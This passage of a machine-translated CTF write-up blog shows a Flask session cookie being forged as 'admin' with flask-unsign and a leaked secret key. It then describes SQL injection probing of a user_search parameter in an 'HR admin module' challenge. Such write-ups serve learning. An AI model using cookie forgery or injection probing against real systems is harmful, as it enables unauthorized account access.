tabindex="0" class="lh li di lj bf lk"><div class="gh gi qj"><img src="../Images/23044660c3af28bb0ac208f24dbf226d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JcFoIMVZhuNUrydo4DvMsQ.png"/></div></div></figure><p id="fdab" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">这澄清了一切，但我更深入一点..</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi qk"><img src="../Images/bf9066e8006202fc62c1ed40fa0019de.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bjXhPUBST2znWa7AYqzouw.png"/></div></div></figure><p id="3afc" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">让我们用<strong class="kh ir">拆瓶</strong>吧，因为我们要做<strong class="kh ir">签字</strong>，<strong class="kh ir">锻造</strong>。根据它的文档，</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi ql"><img src="../Images/289029e32250cca865e41d1bde29ff41.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*d0OSWjjtSnbEX_BSSiJtOg.png"/></div></div></figure><p id="41c6" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我们将修改给定的示例，我们知道当我们解码cookie时，它会给出用户名，还记得吗，<em class="lt"> base64解码</em>？</p><pre class="lc ld le lf gt np nk nq nr aw ns bi"><span id="c414" class="mo lv iq nk b gy nt nu l nv nw">flask-unsign --sign --cookie "admin" --secret '<!-- -->fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y<!-- -->'</span></pre><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi qm"><img src="../Images/2cec35d471252efbd8d19bbd5e6f7889.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1mjCiMkCPaJOyQ24L9aR_g.png"/></div></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">饼干，饼干</figcaption></figure><p id="2aa2" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">太好了，我们得到了一个签名饼干，现在，让我们试着<strong class="kh ir">伪造</strong>它。</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi qn"><img src="../Images/cc27210c7af696ed321acab4c49063ef.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sMk2WHlwdH-wLgxqZIk3Nw.png"/></div></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">wo0t！</figcaption></figure><p id="ac7f" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">解决后，我看到了最后一页，检查它。</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi qo"><img src="../Images/89f67afcb5fafdae160ef21a8ad8a060.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CcQKMWrKePzIz1FjHTQcEQ.png"/></div></div></figure><p id="ca00" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我在想，如果标志存储在某个函数中，比如我们在枚举<strong class="kh ir"> app.config </strong>时看到的<strong class="kh ir"> get_flag() </strong>函数，我们可以更进一步，在不执行上述所有操作的情况下枚举标志。不幸的是，这里的情况并非如此。</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi qp"><img src="../Images/cf60b056a7aea3f151c7c7082d462349.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tb_OiOPhBuMwhSzNcsdY-w.png"/></div></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">一直往前走。(来自社交网络的台词)</figcaption></figure><h1 id="19f4" class="lu lv iq bd lw lx ly lz ma mb mc md me jw mf jx mg jz mh ka mi kc mj kd mk ml bi translated"><strong class="ak">有趣的事实</strong></h1><blockquote class="qq qr qs"><p id="170b" class="kf kg lt kh b ki kj jr kk kl km ju kn qt kp kq kr qu kt ku kv qv kx ky kz la ij bi translated">我在做这个博客的时候，用<strong class="kh ir"> test/test登录。</strong>看看发生了什么！</p></blockquote><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi pp"><img src="../Images/411406ca38aab5dc68ddb2486f9a1e7a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FDU1g19BxMsDhPsQslLCCw.png"/></div></div></figure><blockquote class="qw"><p id="d509" class="qx qy iq bd qz ra rb rc rd re rf la dk translated"><strong class="ak"> <em class="rg">故事寓意:一个人能得957分只是因为运气好！</em> </strong></p><p id="254c" class="qx qy iq bd qz ra rh ri rj rk rl la dk translated"><strong class="ak"> <em class="rg">或者，如果有共同点，你应该尝试所有l33t证书。(当然，你什么也学不到，不，我不要。)</em> </strong></p></blockquote><h1 id="6322" class="lu lv iq bd lw lx ly lz ma mb mc md me jw rm jx mg jz rn ka mi kc ro kd mk ml bi translated">web::人力资源管理模块</h1><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi ol"><img src="../Images/bedf0a3a45910e4fe9faef2690823f1c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Cqv2cobpZfNvtZpm4WzG8g.png"/></div></div></figure><h2 id="2b6c" class="mo lv iq bd lw mp mq dn ma mr ms dp me ko mt mu mg ks mv mw mi kw mx my mk mz bi translated">描述</h2><figure class="lc ld le lf gt lg gh gi paragraph-image"><div class="gh gi rp"><img src="../Images/1728a80bca07ada1133258ed7f9727d7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1158/format:webp/1*QGQ4Mctgk1q45zlwsOB_Zw.png"/></div></figure><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi rq"><img src="../Images/26cff23086d2a8cfc8f16d0fdcb8237a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lPY4ZYVxYQ57j5cDoC4TlQ.png"/></div></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">欢迎页面</figcaption></figure><p id="c857" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir">只有4个解决了！</strong> <em class="lt">(咳嗽)</em>反正有什么错？</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi rr"><img src="../Images/55340e881b7b50894feded2d46bb8438.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*skRt8WeEOKFeFsRUYxLpsg.png"/></div></div></figure><p id="3f20" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我们知道在哪里寻找&amp;我们将利用什么技术。</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi oe"><img src="../Images/f4df2c0ae1c107d3d6995927fb8d4a8f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*n5cNcrmpcv1JpKLnylLQ-Q.png"/></div></div></figure><p id="4551" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">“搜索用户”功能被禁用，但我们可以通过<code class="fe nh ni nj nk b">user_search</code>查看“搜索员工”结构— <code class="fe nh ni nj nk b">/?employee_search=mark</code> <br/>提出请求，根据我的经验，这可能涉及SQL注入访问受限访问。我们可以注入两个参数，让我们两个都试试。<br/> <strong class="kh ir"> employee_search </strong>没有给出任何结果，但是可疑的<strong class="kh ir"> user_search </strong>给出了<em class="lt">(如预期)</em>，我们尝试注入<code class="fe nh ni nj nk b">'</code>，它没有给出任何结果，但是当我刷新页面时，它给出了以下输出:</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi oo"><img src="../Images/1a78d56c1bcae21b885edbcf3eb786b3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tDzgKpPDs-1Pc50nOeIjaw.png"/></div></div></figure><p id="562d" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">看着眼熟，我见过，让我看看出处:</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi oe"><img src="../Images/dd44f4b9ee5a03d3f32f78d37499f934.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_qYsfgRknBLMQn8T4YPL1Q.png"/></div></div></figure><p id="d63a" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">似乎它使用了基于PHP会话的flash messages(<a class="ae no" href="https://stackoverflow.com/questions/32015213/php-session-based-flash-message" rel="noopener ugc nofollow" target="_blank">ref</a>)<br/>之后，我打开了pentestmonkey的Postgres SQL注入备忘单，尝试注入查询。其中一些给出了警告信息，一些没有，但没有一个起作用。我一无所知。</p><p id="a381" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我感觉很糟糕，因为在搜索时我意外地结束了<em class="lt">(不完全是，因为我太累了，我只是点击了)</em>看到了<a class="ae no" href="https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md" rel="noopener ugc nofollow" target="_blank"><strong class="kh ir">PDKT-Team/FBC TF 2019/HR-admin-module</strong></a><br/>如果我花更多的时间，我可能会学到更多，但我仍然深入了解了各种类型的SQL注入，完全没有意识到<strong class="kh ir">带外SQL注入</strong>，<strong class="kh ir">sq</strong></p><blockquote class="qw"><p id="d7c5" class="qx qy iq bd qz ra rh ri rj rk rl la dk translated">这是一个总结，留意<strong class="ak">第二部分</strong></p></blockquote><h1 id="c718" class="lu lv iq bd lw lx ly lz ma mb mc md me jw rm jx mg jz rn ka mi kc ro kd mk ml bi translated">关于作者</h1><p id="9285" class="pw-post-body-paragraph kf kg iq kh b ki nb jr kk kl nc ju kn ko nd kq kr ks ne ku kv kw nf ky kz la ij bi translated">Piyush Raj现在是一名18岁的大学新生，目前在OWASP基金会担任谷歌学生开发者。他是过去的<strong class="kh ir">谷歌代码贡献获奖者</strong>，喜欢玩<strong class="kh ir">足球</strong>。</p><p id="e69f" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><em class="lt">你可以通过</em><a class="ae no" href="https://linkedin.com/in/0x48piraj" rel="noopener ugc nofollow" target="_blank"><strong class="kh ir"><em class="lt">LinkedIn</em></strong></a><strong class="kh ir"><em class="lt">，</em></strong><a class="ae no" href="https://twitter.com/0x48piraj" rel="noopener ugc nofollow" target="_blank"><strong class="kh ir"><em class="lt">Twitter</em></strong></a><strong class="kh ir"><em class="lt">，</em></strong><a class="ae no" href="https://instagram.com/piyushrajofficial" rel="noopener ugc nofollow" target="_blank"><strong class="kh ir"><em class="lt">insta gram</em></strong></a><strong class="kh ir"><em class="lt">与他联系。</em> </strong></p><div class="lc ld le lf gt ab cb"><figure class="rs lg rt ru rv rw rx paragraph-image"><a href="https://www.linkedin.com/in/0x48piraj"><img src="../Images/9b2bb3f0312a7914fc0299458e6d012c.png" data-original-src="https://miro.medium.com/v2/resize:fit:512/format:webp/1*Az4EbkALlCIzJ30PzLI_lw.png"/></a></figure><figure class="rs lg rt ru rv rw rx paragraph-image"><a href="https://twitter.com/0x48piraj"><img src="../Images/4476e5e879742d93fec744863e67034a.png" data-original-src="https://miro.medium.com/v2/resize:fit:512/format:webp/1*qbhMVImJv-rUaG6J5pGaow.png"/></a></figure><figure class="rs lg rt ru rv rw rx paragraph-image"><a href="https://www.instagram.com/piyushrajofficial/"><img src="../Images/416095d604871f3e2b86a8bf4a3339fd.png" data-original-src="https://miro.medium.com/v2/resize:fit:512/format:webp/1*MGp44ZecXqaAAERGnnwelA.png"/></a><figcaption class="ln lo gj gh gi lp lq bd b be z dk ry di rz sa translated">社交爵士乐。</figcaption></figure></div></div></div>    
</body>
</html>